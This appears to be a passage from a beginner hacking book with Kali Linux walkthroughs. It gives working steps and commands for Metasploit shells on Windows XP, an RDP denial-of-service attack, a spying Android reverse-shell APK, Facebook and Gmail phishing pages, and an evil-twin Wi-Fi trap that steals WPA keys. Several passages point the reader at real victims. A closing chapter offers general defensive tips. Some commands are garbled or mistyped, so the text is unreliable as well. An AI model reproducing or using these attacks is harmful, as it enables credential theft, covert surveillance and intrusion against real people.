a	doorway	for	hackers.	An	open	port	is	an	open	door.  Activate	Port	Scan	by	entering	this	command:  use	auxiliary scanner portscan tcp  Display	the	available	scanning	options	by	typing:  	  	  show	options  set	ports	1-600  By	default,	Port	Scan	will	check	each	port	present	in	the	system.	You	don’t	want	this	to happen	since	the	entire	process	will	take	a	long	time.	It	would	be	best	if	you’ll	specify	the range	of	ports	to	be	checked.	Here’s	an	example:   Now,	you	must	specify	the	IP	address	of	your	target.	This	step	is	tricky	since	IP	addresses may	 vary.	 For	 this	 example,	 you	 need	 to	 access	 the	 XP	 virtual	 machine	 and	 launch	 a command	prompt.	Type	“ipconfig”	and	search	for	the	machine’s	IP	address.	Let’s	assume that	the	IP	address	of	your	virtual	machine	is	192.168.62.122.  Return	to	your	Kali	OS	and	enter	the	following:  set	RHOSTS	192.168.62.122  Type	“run”	to	begin	the	process.	Metasploit	will	display	all	of	the	open	ports	present	in your	virtual	machine.	If	the	scan	didn’t	show	any	open	ports,	go	back	to	your	XP	OS	and turn	off	its	firewall.	Then,	run	the	scan	again.	Let’s	assume	that	the	scan	discovered	two open	ports:	135	and	445.  Important	 Note:	 In	 actual	 practice,	 you	 won’t	 know	 the	 IP	 address	 of	 your	 target.	 That means	you	need	to	use	NMAP	to	find	targets	and	their	IP	addresses.  3.	 Search	for	exploits.  This	is	one	of	the	most	important	phases	of	the	attack.	You	must	find	an	exploit	that	works on	 your	 chosen	 target.	 Exit	 the	 Port	 Scanner	 by	 typing	 “back”.	 In	 the	 main	 screen	 of msfconsole,	type	“search	dcom”.	The	“dcom”	exploit	is	one	of	the	best	tools	that	can	use to	hack	an	XP	computer.  the	 module	 called Metasploit	 will	 show	 you	 “exploit windows dcerpc ms03_026_dcom”	and	copy	its	name.	Then,	type	the	following:  results.	 Look	  the	 search	  for	  use	exploit windows dcerpc ms03_026_dcom  Display	the	available	options	by	typing:  show	options  Indicate	the	IP	address	of	your	target.	Here’s	the	code:  set	RHOST	192.168.62.122  	  	  	  	  	   Choose	the	payload	for	your	attack.	The	payload	determines	what	will	happen	once	you have	breached	the	target’s	defenses.	It	may	set	an	open	terminal	or	plant	a	virus.	There	are thousands	of	payloads	available	in	the	Metasploit	framework.	To	find	the	right	payload	for your	current	attack,	type:  payloads  	  	  4.	 The	ideal	payload	for	this	lesson	is	“windows shell_bind_tcp”.	This	payload	opens a	 shell	  or	 command	 prompt 	 in	 the	 target	 through	 a	 TCP	 port.	 You	 can	 set	 this payload	by	typing:  set	PAYLOAD	windows shell_bind_tcp  5.	 Now	that	you	have	specified	each	aspect	of	the	attack,	type	“run”. 6.	 Metasploit	will	tell	you	that	a	shell	has	been	opened	in	your	target	computer.	That shell	gives	you	administrator	privileges	over	your	target.	You	may	download	files from	that	computer	or	send	programs	to	it.	You	may	also	obtain	screenshots	of	the computer	if	you	want.  	 How	to	Use	a	Meterpreter	on	an	XP	Computer Meterpreters	are	the	strongest	payloads	that	you	can	use.	They	give	you	complete	control over	the	 infected	machine.	 In	this	 lesson,	 you’ll	know	 how	to	 send	a	 meterpreter	 using Metasploit.  Important	Note:	 This	process	 is	similar	 to	 the	previous	 one.	The	 only	difference	 is	 that you’ll	 use	 a	 different	 type	 of	 payload.	 To	 keep	 this	 book	 short,	 let’s	 just	 use	 the information	you	collected	earlier	 the	IP	address	and	the	open	ports .	The	remaining	stages of	the	attack	are:  1.	 Identify	the	IP	address	of	your	Kali	Linux	computer.  Payloads	 have	 different	 requirements.	 For	 example,	 a	 payload	 may	 only	 need	 the	 IP address	of	your	target.	Some	payloads,	however,	require	the	IP	address	of	the	attack	–	and meterpreters	belong	to	this	group.	That	means	you	need	to	set	the	IP	of	your	computer	as LHOST	of	a	meterpreter	payload.  If	 you	 don’t	 know	 the	 IP	 address	 of	 your	 Kali	 computer,	 launch	 a	 terminal	 and	 type:   “ifconfig”.	The	terminal	will	display	the	information	you	need.  2.	 Launch	the	Metasploit	framework.  Choose	an	exploit,	set	the	RHOST,	and	indicate	the	payload.	For	this	lesson,	the	exploit that	you	should	use	is	“ms08_067_netapi”.	This	exploit	is	the	most	popular	exploit	for	XP computers.	Set	the	meterpreter	payload	by	typing:  windows meterpreter reverse_tcp  	  3.	 Type	“exploit”	to	launch	the	attack.	A	meterpreter	shell	will	appear	on	your	target computer.	This	shell	allows	you	to	do	a	lot	of	things.	To	view	the	options	available to	you,	just	type	a	question	mark.	Here	are	some	of	the	options:  1.	 sysinfo	 –	 This	 command	 gives	 you	 important	 information	 regarding	 your  2.	 getpid	–	With	this	command,	you	can	identify	the	program	your	meterpreter  3.	 getuid	 –	 Use	 this	 command	 to	 get	 some	 information	 about	 the	 user	 you  target.  is	currently	using.  attacked.  4.	 ps	–	This	command	shows	all	of	the	active	processes	on	the	system. 5.	 run	 killav	 –	 This	 command	 can	 deactivate	 the	 antivirus	 of	 your	 target system.	Use	it	if	you’re	planning	to	inject	some	malicious	programs	into	the computer	you	hacked.  	   How	to	Crash	a	Windows	7	Computer  You	 can	 hack	 Windows	 XP	 easily.	 Its	 younger	 “siblings”	  Windows	 7,	 8,	 and	 10 , however,	 are	 tough	 nuts	 to	 crack.	 These	 modern	 systems	 don’t	 have	 unresolved vulnerabilities.	That	means	you	can’t	run	an	exploit	directly	when	hacking	a	modern	OS.  In	this	section,	your	goal	is	to	bring	down	a	Windows	7	computer	using	the	Metasploit framework.	If	you	are	successful,	the	target	machine	will	display	a	blue	screen	with	some gibberish	on	it.	This	process	is	extremely	easy	when	done	over	a	local	area	network.  Important	 Note:	 You	 must	 have	 Windows	 7	 on	 a	 virtual	 machine.	 Remember:	 don’t practice	your	hacking	skills	on	an	actual	computer.	The	results	can	be	disastrous.  Let’s	divide	the	process	into	several	steps:  	 Data	Gathering You	have	to	determine	the	IP	address	of	your	target.	During	an	actual	penetration	test,	this process	 can	 be	 difficult.	 You	 have	 to	 find	 a	 computer’s	 IP	 address	 without	 getting detected.	In	this	lesson,	however,	identifying	the	IP	address	is	quick	and	easy.	You	just have	to	access	your	virtual	machine,	launch	a	shell,	and	enter	“ipconfig”.	Look	for	the	line that	says	IPv4.  	 Launching	Metasploit Go	back	to	your	Kali	Linux	OS	and	open	a	terminal.	Then,	start	the	Metasploit	framework by	issuing	the	following	commands:  service	postgresql	start  service	metasploit	start  msfconsole  The	“msf”	 Metasploit	Framework 	console	will	appear	on	your	current	terminal.  	 Executing	the	Attack Choose	the	exploit	for	this	attack.	The	command	that	you	must	issue	is:   use	auxiliary dos windows rdp ms12_020_maxchannelids  Type	“show	options”	to	view	the	options	offered	by	this	exploit.	You’ll	find	that	it	has	two requirements:	 RPORT	 and	 RHOST.	 Set	 “3389”	 as	 the	 RPORT,	 since	 it	 is	 the	 port	 for remote	desktops.	Set	the	IP	address	of	your	target	as	the	RHOST.	Then,	type	“exploit”.  Your	target	machine	will	display	a	blue	screen	and	restart.	Computer	users	refer	to	that blue	screen	as	“blue	screen	of	death”.	Metasploit	allows	you	to	perform	this	trick	many times.	In	the	real	world,	this	attack	can	be	frustrating.	Imagine	what	a	person	would	do	if his	computer	keeps	on	rebooting.  	  	   How	to	Hack	an	Android	Phone  Metasploit	 has	 a	 powerful	 payload	 generator	 called	 “msfvenom”.	 With	 msfvenom,	 you can	 create	 payloads	 for	 any	 device	 that	 you	 want	 to	 hack.	 In	 this	 lesson,	 you’ll	 use msfvenom	to	hack	an	Android	phone.  Here	are	the	steps:  type	is:  	  1.	 Access	your	Kali	Linux	computer	and	launch	a	terminal. 2.	 Specify	the	payload	and	generate	an	executable	file.	The	command	that	you	should  root@kali:-	msfvenom	–p	android meterpreter reverse_tcp	LHOST=192.168.0.110 LPORT=4444	R>andro.apk  Important	Note:	Set	your	own	IP	address	in	the	LHOST	section	of	the	code.	Also,	do	not add	extra	space	characters	to	this	code.  3.	 This	 process	 will	 generate	 an	 apk	 file,	 which	 is	 an	 executable	 file	 for	 android  devices.	Send	and	install	this	apk	file	to	the	phone	you	want	to	hack.  4.	 Launch	Metasploit	by	typing	“msfconsole”. 5.	 Activate	the	multi-handler	tool	of	Metasploit	and	set	it	up.	You	will	use	the	multi-  handler	to	control	the	apk	file	you	sent.	The	commands	that	you	must	type	are:  use multi handler  set	payload	android meterpreter reverse_tcp  set	LHOST	 insert	your	IP	address	here   set	LPORT	4444  exploit  	  6.	 Metasploit	will	launch	the	payload	handler.	Now,	you	just	have	to	wait	until	your victim	launches	the	installed	app	in	his	device.		The	name	of	this	app	is	“MAIN ACTIVITY”.	You	will	get	a	meterpreter	terminal	on	the	target	device	as	soon	as	the app	runs.  7.	 Take	 advantage	 of	 the	 hacked	 device	 by	 issuing	 commands.	 Here	 are	 some  commands	that	you	can	use:   1.	 geolocate	–	This	command	allows	you	to	locate	the	target	device. 2.	 record_mic	–	This	command	activates	the	microphone	of	the	hacked	device. The	mic	will	record	every	sound	that	your	victim	makes.	This	information will	be	sent	to	your	computer.  3.	 dump_sms	–	With	this	command,	you	can	obtain	the	text	messages	present  4.	 webcam_stream	 –	 This	 command	 launches	 a	 streaming	 session	 using	 the  5.	 webcam_snap	–	Use	this	command	to	take	a	shot	using	the	camera	of	the  on	the	target	device.  webcam	of	the	target	device.  hacked	phone.  target	device.  6.	 dump_contacts	 –	 This	 command	 grabs	 all	 of	 the	 contacts	 present	 in	 the  	   How	to	Hack	a	Facebook	Account  The	 Facebook	 system	 uses	 modern	 security	 mechanisms.	 It’s	 extremely	 difficult	 to	 get past	 its	 defenses	 and	 obtain	 information	 about	 its	 users.	 Fortunately,	 you	 don’t	 have	 to attack	Facebook	directly	 unless	you	want	to	bring	down	the	site .	If	you’re	just	planning to	steal	the	login	information	of	other	people,	you	can	use	a	phishing	tool	from	your	Kali Linux	computer.  In	this	lesson,	you’ll	create	a	fake	Facebook	login	page.	You’ll	send	this	fake	webpage	to Facebook	users.	Once	a	person	logs	in,	you	will	obtain	all	the	information	he	enters.  	 Credential	Harvester	–	The	Basics Credential	 Harvester	 is	 a	 member	 of	 Kali’s	 social	 engineering	 toolbox.	 It	 can	 create	 a phishing	page	and	send	login	credentials	to	the	hacker.	This	tool	creates	an	IP	address	for the	 attack.	 As	 the	 hacker,	 you	 may	 modify	 the	 resulting	 IP	 address	 to	 make	 it	 more believable.  	 The	Process To	use	the	Credential	Harvester	tool,	you	should:  1.	 Access	your	Kali	Linux	computer	and	launch	a	terminal. 2.	 Issue	the	“setoolkit”	command. 3.	 You’ll	find	the	terms	and	conditions	of	the	toolkit.	Type	“y”	and	hit	the	Enter	key. 4.	 The	terminal	will	list	all	of	the	available	options.	Enter	“1”,	“2”,	and	“3”.	This	will  launch	the	Credential	Harvester	tool.  5.	 Choose	the	option	that	says	“Site	Cloner”. 6.	 Enter	the	following	details:  1.	 Your	IP	address 2.	 The	URL	of	the	website	that	you	want	to	clone  7.	 Minimize	the	terminal	and	go	to	“Places”.	Click	on	“Computer”,	hit	“VAR”,	and  open	the	“WWW	directory”.	Transfer	all	of	the	files	inside	“www”	to	“html”.  8.	 Visit	www.tinyurl.com	to	shorten	the	IP	address.	Once	a	Facebook	user	clicks	on your	 link	 and	 enters	 his	 login	 credentials,	 Credential	 Harvester	 will	 record	 the information	for	you.	It	will	store	the	information	inside	a	text	file,	which	is	located   in	the	WWW	directory	 see	above .  	   How	to	Hack	a	Gmail	Account  This	 lesson	 will	 focus	 on	 a	 popular	 hacking	 tool	 called	 Wapka.	 This	 tool	 can	 help	 you collect	the	Gmail	login	credentials	of	your	victims.  	 Wapka	–	The	Basics Wapka	is	a	site	creation	platform.	It	offers	free	websites	and	hosting	services.	With	this tool,	you	can	create	an	effective	phishing	site	in	just	a	few	minutes.	Additionally,	Wapka doesn’t	require	extensive	knowledge	regarding	PHP	and	MySQL.  	 The	Requirements  1.	 A	target 2.	 Familiarity	with	Gmail 3.	 Familiarity	with	HTML	codes 4.	 Familiarity	with	website	creation 5.	 A	Gmail	account  	 The	Process  1.	 Visit	http:  u.wapka.com wap en signup	and	create	a	Wapka	account. 2.	 Access	your	account,	search	for	“Site	List”,	and	click	on	“Create	New	Site”. 3.	 Specify	 the	 name	 of	 your	 website.	 Wapka	 allows	 you	 to	 combine	 numbers	 and letters.	You	can’t	use	any	special	character.	For	this	lesson,	let’s	assume	that	the name	 of	 your	 site	 is	 “samplesite”.	 The	 URL	 of	 your	 website	 will	 be “samplesite.wapka.mobi”.  4.	 Activate	the	Admin	mode	of	your	new	site. 5.	 You’ll	see	a	blank	webpage.	It	is	empty	because	you	haven’t	done	anything	on	your  site.	Look	for	the	link	that	says	“EDIT	SITE”	and	click	on	it.  6.	 In	the	next	screen,	hit	the	“Mail	Form”	link. 7.	 Make	sure	that	CAPTCHA	is	disabled.	Click	on	“Submit	and	Remember”. 8.	 Go	back	to	the	site	list	and	launch	the	website	you’re	working	on.	This	time,	don’t activate	the	Admin	mode.	Look	at	the	bottom	of	the	webpage	and	hit	“Source	Code Viewer”.   9.	 Place	 the	 URL	 of	 your	 site	 inside	 the	 large	 box.	 You’ll	 see	 a	 lot	 of	 checkboxes.  Search	for	an	entry	that	looks	like	“value=xxxxx”.	Take	note	of	that	value. 10.																						Activate	the	Admin	mode,	click	on	“Edit	Site”,	and	choose	“Users”. 11.																						Hit	“Items	Visibility”	and	select	“Visible	Only	in	Admin	Mode”. 12.																						Access	the	site	again	and	activate	the	Admin	mode.	Hit	“EDIT	SITE” and	“WML HTML	CODE”.	Paste	the	following	code	onto	the	page:     <!DOCTYPE	wml	PUBLIC	“-  WAPFORUM  DTD	WML	1.1  EN” “http:  www.wapforum.org DTD wml_1.1.xml”>               	document.title	=	“Sign	in”;	  Sign in   <link	rel=“shortcut	icon”	type=“image x-icon” href=“http:  greentooth.xtgem.com i3 gs1.png” >    <body	dir=“ltr”  style=“background-color:	eee;	font-family:	arial,	helvetica,	sans-serif;	font-size:	13px; padding:	0;	margin:	0;”>     <img	src=”  ssl.gstatic.com accounts ui logo_sm.png”                 border=“0”  align=“bottom”  alt=“Google” >      Sign	in              <div	style=“background-color:	fff;	border-color:e5e5e5;	border-width: 1px	0	1px	0;	border-style:	solid;	padding:	10px	0	10px	10px;	margin:	0;”><form method=“post”	class=“mobile-login-form” onSubmit=“window.open ‘https:  accounts.google.com ServiceLogin? service=mail&amp;passive=true&amp;continue=https:  mail.google.com mail ? ui%3Dmobile%26zyp%3Dl&amp;scc=1&amp;ltmpl=ecobx&amp;nui=5&amp;btmpl=mobile&amp;emr=1’ ”	 action=” site_0.xhtml”>  Username          Password             	Stay	signed	in    <input	type=“submit” name=“MF_submit”	value=”	Sign	in	”	class=“button” >	        New	to	Gmail?

Once	a	Gmail	user accesses	that	page	and	tries	to	log	in,	you	will	obtain	his	login	credentials.  	 The	Things	You	Should	Know  Facebook	blocks	all	Wapka-related	URLs.	That	means	you	can’t	phish	for	Gmail passwords	using	your	Facebook	account. Wapka	 is	 not	 available	 in	 India.	 The	 government	 of	 that	 country	 is	 currently blocking	all	Wapka-related	sites. You	may	use	proxy	services	to	bypass	the	limitations	given	above. You	must	encourage	Gmail	users	to	access	their	email	account	through	your	fake webpage.	Here	are	some	techniques	that	you	can	use:   Shorten	the	web	address	of	your	phishing	site	through	www.tinyurl.com. Send	 the	 URL	 to	 people	 who	 have	 poor	 knowledge	 regarding	 digital security. Utilize	social	engineering	tactics	to	attract	more	victims.  	   How	to	Gather	Information	Using	Kali	Linux  As	you’ve	learned	in	previous	chapters,	information	gathering	is	an	important	aspect	of hacking	and	penetration	testing.	Your	chances	of	succeeding	will	significantly	increase	if you	have	a	lot	of	data	about	your	target.	In	this	part	of	the	book,	you’ll	learn	how	to	use Kali	Linux	in	collecting	information.  	 TheHarvester	–	The	Basics Kali	 Linux	 has	 an	 extensive	 collection	 of	 “reconnaissance”	 tools.	 To	 keep	 this	 section short,	let’s	focus	on	a	tool	called	“TheHarvester”.	TheHarvester	is	a	Python-based	tool	that can	collect	important	information	on	your	behalf.	It	can	grab	usernames,	email	addresses, hostnames,	and	subdomains	from	various	sources.  	 The	Process Access	 your	 Kali	 Linux	 computer	 and	 open	 a	 terminal.	 Then,	 type	 “theharvester”	 to launch	the	reconnaissance	tool.	TheHarvester	comes	as	a	built-in	tool	for	the	latest	Kali versions,	so	you	probably	don’t	need	to	download	anything.	If	your	computer	doesn’t	have this	 program,	 however,	 you	 can	 visit	 https:  github.com laramies theHarvester	 to download	it.  theHarvester	–d	[www.sampleurl.com]	–l	300	–b	[name	of	search	engine]  Here	are	the	steps	that	you	need	to	take:  1.	 Use	the	following	syntax:  	  Here’s	an	example:  	  theHarvester	–d	facebook.com	–l	300	–b	bing  2.	 Just	 replace	 www.sampleurl.com	 with	 the	 URL	 of	 your	 target	 website.	 Then, indicate	the	search	engine	that	you	want	to	use.	The	result	that	you’ll	get	depends on	the	information	that	the	search	engine	can	pull.	If	you	want	to	grab	all	of	the available	 information	 regarding	 your	 target,	 type	 “all”	 at	 the	 end	 of	 the	 code   instead.	For	example:  theHarvester	–d	facebook.com	–l	300	–b	all  	  	  3.	 The	search	results	will	appear	on	the	terminal.	If	you	want	to	save	the	information,  you	may	add	“-f”	to	the	command	and	specify	a	filename.	Here’s	an	example:  theHarvester	–d	facebook.com	–l	300	–b	bing	–f	sample  The	resulting	file	is	in	the	HTML	format.   How	to	set	up	an	Evil	Twin	AP  Evil	 Twin	 APs	  i.e.	 Access	 Points 	 are	 rigged	 access	 points	 that	 pretend	 to	 be	 WiFi hotspots.	When	a	person	connects	to	an	Evil	Twin	AP,	his	information	will	be	exposed	to the	hacker.  To	the	victim,	the	malicious	access	point	is	a	hotspot	that	has	great	signal.	This	perception results	from	the	fact	that	the	hacker	is	near	the	victim.	People	love	strong	WiFi	networks, so	it’s	likely	that	a	victim	will	connect	to	an	Evil	Twin	AP.  	  	  	  	 The	Process  1.	 Access	your	Kali	computer. 2.	 Make	sure	that	you	have	internet	connection. 3.	 Launch	a	terminal	and	enter  apt-get	install	dhcp3-server  This	command	will	install	a	DHCP	server	onto	your	machine.  And	press	Enter.	Your	terminal	will	display	an	empty	file.  5.	 Type	the	following	commands:  4.	 Type  nano etc dhcpd.conf  authoritative  default-lease-time	600  max-lease-time	6000  subnet	192.168.1.128	netmask	255.255.255.128	{  option	subnet-mask	255.255.255.128  option	broadcast-address	192.168.1.255   option	routers	192.168.1.129  option	domain-name-servers	8.8.8.8  range	192.168.1.130	192.168.1.140  6.	 Once	done,	use	the	CTRL+X	key	combination	and	press	“Y”. 7.	 Switch	to	another	directory	by	typing:  8.	 Then,	issue	the	following	commands:  wget	http:  hackthistv.com eviltwin.zip  cd	 var www  rm	index.html  unzip	eviltwin.zip  rm	eviltwin.zip  9.	 Trigger	MySQL	and	the	Apache	server	by	typing:   etc init.d mysql	start   etc init. apache2	start  }  	  	  	  	  	  10.																						You	will	use	MySQL	to	generate	a	database	for	storing	WPA WPA2 passwords.	Here	are	commands	that	you	must	issue:  Mysql	–u	root  create	database	evil_twin;  use	evil_twin  create	tale	wpa_keys passwors	varchar 64 ,	confirm	varchar 64  ;  11.																						Type	“ip	route”	to	determine	your	local	IP	address.   	  	  	  	  	  12.																						Identify	the	name	of	your	network	adapter	using	this	command:  airmon-ng	start	wlan0  13.		 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 Update	 the	 OUI	  Organizationally	 Unique	 Identifier 	 of	 your Airodump-ng	program.	Here’s	the	command:  airodump-ng-oui-update  14.			 		 		 		 	 		 		 		 	 		 		 	Find	the	ESSID	 Extended	Service	Set	Identification ,	BSSID	 the MAC	 address	 of	 your	 access	 point ,	 and	 the	 channel	 that	 you	 need	 to	 use.	 The command	that	you	should	use	is:  airodump-ng	–M	mon0  15.																						Activate	the	Evil	Twin	AP	using	this	syntax:  airbase-ng	–e	[insert	ESSID	here]	–c	[insert	channel	number	here]	–P	mon0  16.																						The	Airbase-ng	program	created	a	tunnel	interface	on	your	behalf.	You just	have	to	configure	this	tunnel	interface	to	connect	your	wired	interface	and	your “evil”	access	point.	To	do	this,	you	must	launch	a	terminal	and	type	the	following:  ifconfig	[name	of	tunnel	interface]	192.168.1.129	netmask	255.255.255.128  17.																						Enable	internet	protocol	forwarding	through	these	commands:  route	add	–net	192.168.1.128	netmask	255.255.255.128	gw	192.186.1.129  echo	1	>		 proc sys net ipv4 ip_forward  iptables	–table	net	–append	POSTROUTING	–out-interface	[name	of	local	interface]	–j MASKQUERADE  iptables	–append	FORWARD	–in-interface	[name	of	tunnel	interface]	–j	ACCEPT  iptables	–t	net	–A	PREROUTING	–p	tcp	–dport	80	–j	DNET	–to-destination	[LOCALIP ADDRESS:80]   iptables	–t	net	–A	POSTROUTING	–j	MASQUERADE  dhcpd	–cf	 etc. dhcpd.conf	–pf	 var run dhcpd.pid	[name	of	tunnel	interface]  etc. init.d isc-dhcp-server	start  18.		 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	Disconnect	your	targets	from	their	current	wireless	networks.	To accomplish	 this,	 you	 must	 generate	 a	 “blacklist”	 file	 to	 hold	 the	 target’s	 BSSID. Issue	the	following	commands:  echo	[BSSID]	>	blacklist  mdk3	mon0	d	–b	blacklist	–c	[CH.]  19.																						Look	at	the	terminal	that	holds	your	Airbase-ng	program.	See	if	a	target connected	 to	 your	 access	 point.	 When	 a	 person	 tries	 to	 connect,	 he	 will	 see	 a security	page	that	asks	for	the	WPA WPA2	key. 20.																						Check	the	terminal	for	your	MySQL	database	and	enter	the	following:  	  	  use	evil_twin  	  21.																						Access	“wpa_keys”	to	view	the	data	entered	by	your	target.    Chapter	7:	How	to	Protect	Yourself  Today,	countless	hackers	are	on	the	loose.	These	people	are	spreading	computer	viruses through	the	internet.	If	you	aren’t	careful,	malicious	programs	might	infect	your	machine.  In	this	chapter,	you’ll	learn	how	to	protect	yourself	from	usual	techniques	and	vectors	that hackers	use.  	   Prevent	the	Typical	Attack	Vectors  Hackers	use	the	following	vectors	to	lure	victims:  	 Scams It’s	your	lucky	day.	Someone	from	Nigeria	needs	your	help	in	smuggling	money	from	his country.	 You	 don’t	 have	 to	 do	 anything	 difficult.	 You	 just	 have	 to	 conduct	 some	 wire transfers	and	wait	for	the	Nigerian	to	give	you	your	share	of	the	funds.  While	checking	the	inbox	of	your	email	account,	you	saw	a	message	saying	you	won	a contest.	You	just	have	to	send	some	money	for	shipping	and	wait	for	your	prize	to	arrive.  The	situations	given	above	are	typical	scams.	You	probably	think	that	nobody	would	fall for	them.	Well,	nothing	could	be	further	from	the	truth.	Thousands	of	people	fall	for	such tricks.	Victims	send	money	and or	confidential	information	to	the	hackers,	hoping	for	a quick	benefit.  Think	before	reacting	to	any	email.	Scams	work	best	against	people	who	act	quickly.	If	an email	says	something	that	is	too	good	to	be	true,	ignore	it.	If	the	message	asks	you	to	give personal	information,	report	the	email	and	tag	it	as	spam.  	 Trojan	Horses A	 Trojan	 horse	 serves	 as	 a	 container	 for	 malicious	 programs.	 This	 “container”	 often appears	as	an	interesting	or	important	file.	Once	you	download	a	Trojan	horse,	its	contents will	infect	your	computer.	This	technique	is	extremely	effective	in	turning	innocent	users into	hapless	victims.  In	most	cases,	hackers	use	emails	in	sending	out	Trojans.	They	send	a	phishing	email	that contains	a	Trojan	as	an	attachment.	The	email	will	encourage	you	to	download	and	open the	included	file.  Some	hackers,	however,	use	social	networking	sites	in	spreading	out	Trojans.	They	post videos	with	interesting	titles.	Once	you	click	on	the	video,	the	webpage	will	tell	you	that you	must	update	your	browser	first	if	you	want	to	view	the	content.	Well,	the	“update”	that you	need	to	download	and	install	is	a	Trojan.  The	best	way	to	fight	this	hacking	vector	is	by	using	your	common	sense	and	running	an   updated	antivirus	program.  	 Automatic	Downloads In	 some	 situations,	 even	 up-to-date	 security	 programs	 are	 not	 enough.	 Your	 computer might	 have	 one	 or	 more	 vulnerable	 programs	 that	 hackers	 can	 take	 advantage	 of.	 For example,	if	you	have	an	old	version	of	a	computer	application,	it	may	be	vulnerable	to viruses.  Hackers	 exploit	 vulnerabilities	 present	 in	 a	 program	 by	 establishing	 a	 rigged	 website. These	people	attract	victims	by	sending	out	phishing	messages	through	emails	or	social networking	sites.  Keep	in	mind,	however,	that	hackers	are	not	limited	to	their	own	sites.	They	can	attack	a legitimate	site	and	insert	malicious	codes	into	it.	Once	you	visit	a	compromised	site,	the inserted	 codes	 will	 scan	 your	 machine	 for	 vulnerable	 programs.	 Then,	 the	 codes	 will install	viruses	onto	your	machine	automatically.  You	 can	 protect	 yourself	 by	 keeping	 your	 computer	 applications	 updated.	 Software developers	 release	 updates	 and or	 patches	 for	 their	 products.	 Most	 programs	 can	 detect whenever	a	new	update	is	available.	They	will	just	ask	you	whether	or	not	you	would	like to	update	your	program.	Hit	“Yes”	and	wait	for	the	update	process	to	complete.  	 Exploiting	Weak	Passwords Fictional	stories	depict	hackers	as	people	who	can	guess	passwords	with	ease.	Real	world hackers,	however,	rarely	use	this	method.	They	don’t	even	bother	guessing	their	victims’ passwords.	They	use	various	methods	to	obtain	that	crucial	information.  You	can	enhance	your	online	security	by	using	different	passwords	for	different	sites.	For example,	the	password	of	your	Facebook	account	should	be	different	from	that	of	your Twitter	 account.	 This	 way,	 your	 Twitter	 account	 will	 still	 be	 safe	 even	 if	 a	 hacker successfully	attacks	your	Facebook	profile,	and	vice	versa.  Using	the	same	password	for	all	of	your	accounts	is	extremely	risky.	When	one	of	your accounts	gets	compromised,	the	rest	of	your	accounts	will	also	be	in	danger.	You	don’t have	to	use	completely	different	passwords.	It’s	enough	to	add	some	characters	to	your main	password	to	create	different	variations.   A	hacker	might	also	try	to	answer	your	security	questions.	You	can	protect	your	account by	giving	an	answer	that	is	not	related	to	the	question.	This	way,	the	hacker	won’t	be	able to	access	your	account,	regardless	of	how	diligently	he	conducted	his	research.  	 Taking	Advantage	of	Open	WiFi The	term	“open	WiFi”	refers	to	a	wireless	network	without	any	form	of	encryption.	That means	anyone	can	connect	to	the	network	and	interact	with	the	machines	inside	it.	When	a hacker	gets	into	your	network,	he	will	be	able	to	view	and	record	all	of	the	things	you	do. He	may	also	visit	restricted	websites	and or	download	files	illegally	through	your	internet connection.	When	that	hacker	does	something	illegal	and	gets	tracked,	the	police	will	visit you.  It’s	important	to	set	a	password	for	your	WiFi	network.	Make	sure	that	the	encryption	for your	 network	 is	 set	 to	 WPA WPA-2.	 This	 encryption	 involves	 hashing,	 which	 makes hacking	an	extremely	difficult	task.  	   How	to	Protect	Your	Website	from	Hackers  There	are	a	lot	of	reasons	why	a	hacker	would	attack	a	company	website.	For	example,	a hacker	might	try	to	steal	your	financial	information	for	personal	purposes.	He	might	also try	 to	 obtain	 business-related	 data	 and	 sell	 it	 to	 your	 competitors.	 Because	 of	 this,	 you must	do	your	best	in	protecting	your	site	from	malicious	hackers.  	 Typical	Hacking	Attacks  SQL	 Injection	 –	 With	 this	 attack,	 a	 hacker	 can	 spoof	 your	 identity,	 access	 your site’s	database,	and	destroy modify	the	information	inside	your	database.	Here,	the hacker	will	insert	malicious	SQL	codes	into	the	form	fields	of	your	website. DDoS	 Distributed	Denial	of	Service 	–	The	goal	of	this	attack	is	to	bring	down	a website	temporarily.	If	a	DDoS	attack	is	successful,	legitimate	users	won’t	be	able to	 use	 the	 website.	 Hackers	 perform	 it	 by	 flooding	 the	 target	 with	 continuous requests. CSRF	  Cross	 Site	 Request	 Forgery 	 –	 Here,	 the	 hacker	 will	 hijack	 a	 session	 to make	purchases	on	the	victim’s	behalf.	This	attack	happens	when	the	victim	clicks on	a	URL	or	downloads	a	file	that	runs	unknown	and or	unwanted	actions. XSS	  Cross-Site	 Scripting 	 –	 Hackers	 use	 this	 technique	 to	 destroy	 your	 website and or	run	their	payloads.	Basically,	an	XSS	attack	happens	when	a	hacker	injects malicious	codes	or	payloads	into	a	program	that	runs	on	the	user’s	end.  	 The	Defensive	Measures To	protect	your	website	from	malicious	attacks,	you	should:  Ask	skilled	programmers	to	review	the	codes	on	your	website. Run	code	scanners. Offer	rewards	to	people	who	will	detect	existing	bugs	within	your	site. Make	 sure	 that	 your	 site	 has	 WAF	  Web	 App	 Firewall .	 This	 type	 of	 firewall monitors	your	system	and	prevents	potential	attacks. Implement	CAPTCHA	or	ask	website	visitors	to	answer	a	question.	This	way,	you can	make	sure	that	each	request	comes	from	a	human.  	   How	to	Keep	Your	Business	Secure  Here	are	some	practical	tips	that	you	can	use	in	protecting	your	business:  Don’t	store	irrelevant	customer	information	–	Your	website	will	be	a	tasty	target	for hackers	if	it	contains	various	customer	related	information.	If	you	want	to	protect your	business,	don’t	save	information	that	you	are	not	going	to	use.	For	example, refrain	from	storing	the	credit	card	information	of	your	customers	if	you	don’t	need it	for	your	business.  Hacking	 is	 a	 difficult	 activity.	 Hackers	 won’t	 attack	 you	 if	 your	 website	 doesn’t	 have anything	 worthy	 of	 stealing.	 Storing	 customer	 information	 is	 convenient.	 However,	 the risks	involved	here	outweigh	the	benefits.  Make	sure	that	you	have	the	right	technology	–	Hackers	rely	on	modern	tools	and newly-discovered	vulnerabilities.	Your	business	won’t	be	able	to	survive	a	hacking attack	 if	 it	 relies	 on	 outdated	 technology.	 It	 would	 be	 best	 if	 you’ll	 implement	 a two-factor	authentication	before	giving	access	to	confidential	information. Educate	your	people	–	The	defense	of	your	network	is	as	powerful	as	your	weakest employee.	Keep	in	mind	that	hackers	can	use	social	engineering	tactics.	If	one	of your	employees	falls	for	such	tricks,	the	security	of	your	business	will	be	in	danger. Your	 firewall	 and	 flawless	 website	 codes	 won’t	 matter	 if	 your	 employees	 are reckless	when	dealing	with	their	passwords.  These	 days,	 digital	 security	 is	 everyone’s	 job.	 Educate	 your	 employees	 regarding	 the importance	 of	 vigilance	 and	 carefulness,	 especially	 when	 handling	 confidential information.	In	addition,	train	your	people	on	how	to	